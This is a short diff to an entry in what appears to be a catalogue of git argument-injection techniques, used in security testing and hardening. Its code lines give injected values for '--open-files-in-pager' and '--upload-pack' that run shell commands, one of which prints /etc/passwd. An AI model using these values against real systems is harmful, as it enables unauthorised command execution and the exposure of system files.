@@ -2,11 +2,11 @@
 description: Git is an extremely powerful tool with more functionality than one can count. This list is non-exhaustive, but includes examples which have historically been useful for exploitation.
 functions:
   command:
-    - description: The --open-files-in-pager flag can be used to run arbitrary commands.
+    - description: The --open-files-in-pager flag can be used to run arbitrary commands. Any of the following should work.
       code: |
         git grep --open-files-in-pager='uname -a #' .
         git grep --open-files-in-pager='uname;' .
-    - description: The --upload-pack flag can be used in multiple contexts. Note that the output is not necessarily shown (but you can route the output to stderr and possibly view it, by using `>&2`). ls-remote is the only example which does not require the command to be run within a tracked folder.
+    - description: The --upload-pack flag can be used in multiple contexts. Note that the output is not necessarily shown (but you can route the output to stderr and possibly view it, by using `>&2`). ls-remote is the only example which does not require the command to be run within a tracked folder. Any of the following should work.
       code: |
         git ls-remote --upload-pack='uname -a > /tmp/file #' main
         git fetch origin --upload-pack='cat /etc/passwd >&2 ;'
